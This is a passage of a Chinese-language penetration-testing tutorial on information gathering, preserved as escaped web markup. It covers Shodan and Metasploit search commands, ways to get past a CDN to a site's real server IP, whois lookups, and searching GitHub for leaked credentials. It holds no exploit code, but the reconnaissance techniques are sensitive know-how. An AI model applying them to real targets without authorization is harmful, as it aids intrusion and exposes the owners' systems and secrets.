__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/7.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤。&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;使用搜索过滤\&quot;&gt;使用搜索过滤&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#使用搜索过滤\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hostname：搜索指定的主机或域名，例如hostname:\&quot;google\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;port：搜索指定的端口或服务，例如port:\&quot;21\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;country：搜索指定的国家，例如country:\&quot;CN\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;city：搜索指定的城市，例如city:\&quot;Hefei\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;org：搜索指定的组织或公司，例如org:\&quot;google\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;isp：搜索指定的ISP供应商，例如isp:\&quot;China Telecom\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;product：搜索指定的操作系统/软件/平台，例如product:\&quot;Apache httpd\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;version：搜索指定的软件版本，例如 version:\&quot;1.6.2\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;geo：搜索指定的地理位置，参数为经纬度，例如 geo:\&quot;31.8639, 117.2808\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;before/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy，例如 before:\&quot;11-11-15\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;net：搜索指定的IP地址或子网，例如 net:\&quot;210.45.240.0/24\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Kali中安装 Shodan&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Shodan 是由官方提供的 Python 库&lt;/p&gt;\n&lt;h2 id=\&quot;kali中安装-shodan\&quot;&gt;Kali中安装 Shodan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kali中安装-shodan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Shodan 是由官方提供的 Python 库&lt;/p&gt;\n&lt;p&gt;安装命令：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;git clone https://github.com/achillean/shodan-python.git &amp;#x26;&amp;#x26; cd shodan-python&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python setup.py install&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&quot;kali中shodan的使用\&quot;&gt;Kali中Shodan的使用&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#kali中shodan的使用\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;官方用法：Shodan Command-Line Interface\nCommands:&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;alert Manage the network alerts for your account # 管理账户的网络提示&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;convert Convert the given input data file into a... # 转换输入文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;count Returns the number of results for a search # 返回查询结果数量&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;download Download search results and save them in a... # 下载查询结果到文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;honeyscore Check whether the IP is a honeypot or not. # 检查 IP 是否为蜜罐&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;host View all available information for an IP... # 显示一个 IP 所有可用的详细信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;info Shows general information about your account # 显示账户的一般信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;init Initialize the Shodan command-line # 初始化命令行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;myip Print your external IP address # 输出用户当前公网IP&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;parse Extract information out of compressed JSON... # 解析提取压缩的JSON信息，即使用download下载的数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;scan Scan an IP/ netblock using Shodan. # 使用 Shodan 扫描一个IP或者网段&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;search Search the Shodan database # 查询 Shodan 数据库&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stats Provide summary information about a search... # 提供搜索结果的概要信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stream Stream data in real-time. # 实时显示流数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;初始化Shodan：shodan init API_Key&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;返回查询结果的数量：shodan  count  SSH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;将查询到的结果下载：shodan download microsoft-data microsoft iis 6.0 。将搜索结果下载到  microsoft-data 文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载 100 条结果。如果我们想获取更多的结果，需要我们花钱注册，然后下载的时候指定—limit参数。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/8.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n解析下载的数据：shodan parse —fields ip_str,port,org —separator , microsoft-data.json.gz\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/9.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/10.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nshodan search microsoft iis 6.0\nsearch查找，直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/11.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shodan search --fields ip_str,port,org,hostnames microsoft iis 6.0&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/12.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;msf中使用shodan\&quot;&gt;MSF中使用Shodan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#msf中使用shodan\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use auxiliary/gather/shodan_search #使用shodan模块&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set shodan_apikey xxxxxxxx #设置shodan的API&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set query JAWS/1.0 #设置查询词&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exploit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/13.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;域名信息收集\&quot;&gt;域名信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#域名信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;通过域名查询ip\&quot;&gt;通过域名查询IP&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#通过域名查询ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;查询网站\&quot;&gt;查询网站&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查询网站\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了CDN&lt;/p&gt;\n&lt;p&gt;ping测试网站有：\n&lt;a href=\&quot;https://wepcc.com/\&quot;&gt;https://wepcc.com/&lt;/a&gt;\n&lt;a href=\&quot;http://ping.chinaz.com/\&quot;&gt;http://ping.chinaz.com/&lt;/a&gt;\n&lt;a href=\&quot;http://ping.aizhan.com/\&quot;&gt;http://ping.aizhan.com/&lt;/a&gt;&lt;/p&gt;\n&lt;h3 id=\&quot;什么是cdn\&quot;&gt;什么是CDN&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#什么是cdn\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。&lt;/p&gt;\n&lt;h4 id=\&quot;2113-cdn的优势\&quot;&gt;2.1.1.3 CDN的优势&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#2113-cdn的优势\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h4&gt;\n&lt;p&gt;提高用户访问速率，优化用户使用体验。\n隐藏真实服务器的IP\n提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。CDN节点将认为无害的数据提交给真实的主机服务器。&lt;/p&gt;\n&lt;h3 id=\&quot;几种访问方式的不同\&quot;&gt;几种访问方式的不同&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#几种访问方式的不同\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;传统访问：用户访问域名—&gt;解析服务器IP—&gt;访问目标主机\n普通CDN：用户访问域名—&gt;CDN节点—&gt;真实服务器IP—&gt;访问目标主机\n带WAF的CDN：用户访问域名—&gt;CDN节点（云WAF）—&gt;真实服务器IP—&gt;访问目标主机&lt;/p&gt;\n&lt;h3 id=\&quot;cdn的配置\&quot;&gt;CDN的配置&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#cdn的配置\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;将域名的 NS 记录指向 CDN 厂商提供的 DNS 服务器。\n给域名设置一个 CNAME 记录，将它指向CDN厂商提供的另一个域名。\n所以在渗透测试中，为了要知道网站服务器的真实IP，我们必须绕过CDN查找出网站的真实ip地址。\n查询域名相关的网站：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;DNS查询：&lt;a href=\&quot;https://dnsdb.io/zh-cn/\&quot;&gt;https://dnsdb.io/zh-cn/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;微步在线：&lt;a href=\&quot;https://x.threatbook.cn/\&quot;&gt;https://x.threatbook.cn/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;在线域名信息查询：&lt;a href=\&quot;http://toolbar.netcraft.com/site_report?url=\&quot;&gt;http://toolbar.netcraft.com/site_report?url=&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;DNS、IP等查询：&lt;a href=\&quot;http://viewdns.info/\&quot;&gt;http://viewdns.info/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;CDN查询IP：&lt;a href=\&quot;https://tools.ipip.net/cdn.php\&quot;&gt;https://tools.ipip.net/cdn.php&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;SecurityTrails平台：&lt;a href=\&quot;https://securitytrails.com/domain/www.baidu.com/history/a\&quot;&gt;https://securitytrails.com/domain/www.baidu.com/history/a&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=\&quot;绕过cdn的方法\&quot;&gt;绕过CDN的方法&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#绕过cdn的方法\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=\&quot;查询子域名\&quot;&gt;查询子域名&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查询子域名\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;通过爆破子域名进行查询，如 Layer子域名爆破机、subDomainBrute，在线子域名查询网站：&lt;a href=\&quot;https://phpinfo.me/domain/\&quot;&gt;https://phpinfo.me/domain/&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;通过查询DNS服务器，查询该域下的解析记录&lt;/p&gt;\n&lt;p&gt;通过HTTPS证书来查询(只适用于https网站) ，如：&lt;a href=\&quot;https://crt.sh/%E5%B0%B1%E6%98%AF%E9%80%9A%E8%BF%87https%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D\&quot;&gt;https://crt.sh/就是通过https证书查询子域名&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;通过google查询&lt;/p&gt;\n&lt;h3 id=\&quot;查询主域名\&quot;&gt;查询主域名&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查询主域名\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。&lt;/p&gt;\n&lt;h3 id=\&quot;邮件服务器\&quot;&gt;邮件服务器&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#邮件服务器\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。&lt;/p&gt;\n&lt;h3 id=\&quot;查看域名历史解析记录\&quot;&gt;查看域名历史解析记录&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#查看域名历史解析记录\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站&lt;a href=\&quot;https://www.netcraft.com\&quot;&gt;https://www.netcraft.com&lt;/a&gt; 来观察域名的IP历史记录。&lt;/p&gt;\n&lt;h4 id=\&quot;国外访问\&quot;&gt;国外访问&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#国外访问\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h4&gt;\n&lt;p&gt;国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站&lt;a href=\&quot;https://asm.ca.com/en/ping.php\&quot;&gt;https://asm.ca.com/en/ping.php&lt;/a&gt; 访问 ，可能会得到真实的ip地址。&lt;/p&gt;\n&lt;h3 id=\&quot;nslookup查询\&quot;&gt;Nslookup查询&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nslookup查询\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。\n各种解析记录&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;A 主机记录，记录域名对应的ip&lt;/li&gt;\n&lt;li&gt;PTR 反向地址解析记录，记录ip对应的域名&lt;/li&gt;\n&lt;li&gt;CNAME 别名记录&lt;/li&gt;\n&lt;li&gt;MX 邮箱交换记录&lt;/li&gt;\n&lt;li&gt;NS 服务器记录&lt;/li&gt;\n&lt;li&gt;SOA 权威记录&lt;/li&gt;\n&lt;li&gt;TXT 为记录说明&lt;/li&gt;\n&lt;li&gt;SRV 列出了正在提供特定服务的服务器&lt;/li&gt;\n&lt;li&gt;AAAA ipv6地址记录\nA (Address) 记录也叫主机记录，是用来指定域名对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的网页服务器(web server)上。同时也可以设置域名的子域名。通俗来说A记录就是服务器的IP，域名绑定A记录就是告诉DNS，当输入域名的时候给你引导向设置在DNS的A记录所对应的服务器。在命令行下可以通过nslookup -qt=a &lt;a href=\&quot;http://www.baidu.com%E6%9D%A5%E6%9F%A5%E7%9C%8BA%E8%AE%B0%E5%BD%95%E3%80%82\&quot;&gt;www.baidu.com来查看A记录。&lt;/a&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/14.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=\&quot;网站漏洞\&quot;&gt;网站漏洞&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网站漏洞\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址&lt;/p&gt;\n&lt;h3 id=\&quot;censys查询ssl证书找到真实ip\&quot;&gt;Censys查询SSL证书找到真实IP&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#censys查询ssl证书找到真实ip\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在&lt;a href=\&quot;https://crt.xn--shSSLHASH-rb6nx5at77oxxownaz80pknbhz7al4su67c\&quot;&gt;https://crt.sh上查找目标网站SSL证书的HASH&lt;/a&gt;，然后再用Censys搜索该HASH即可得到真实IP地址。&lt;/p&gt;\n&lt;h2 id=\&quot;域名的whois信息\&quot;&gt;域名的whois信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#域名的whois信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。&lt;/p&gt;\n&lt;p&gt;查询的网站：&lt;a href=\&quot;http://whois.chinaz.com/\&quot;&gt;http://whois.chinaz.com/&lt;/a&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;公司敏感信息收集\&quot;&gt;公司敏感信息收集&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#公司敏感信息收集\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。&lt;/p&gt;\n&lt;p&gt;在渗透测试的信息收集阶段，可以去Github和码云上搜索与目标有关的信息，或者就有意想不到的收获。(有些开发人员将代码上传到代码库的时候，有可能连一些重要的配置信息也上传了)&lt;/p&gt;\n&lt;h2 id=\&quot;github的搜索\&quot;&gt;Github的搜索&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#github的搜索\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;访问&lt;a href=\&quot;https://github.com/%EF%BC%9BGithub%E7%9A%84%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95%EF%BC%9A\&quot;&gt;https://github.com/；Github的搜索语法：&lt;/a&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;in:name test #仓库标题搜索含有关键字 SpringCloud&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;in:descripton test #仓库描述搜索含有关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;in:readme test #Readme文件搜素含有关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stars:&gt;3000 test #stars数量大于3000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;forks:&gt;1000 test #forks数量大于1000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;size:&gt;=5000 test 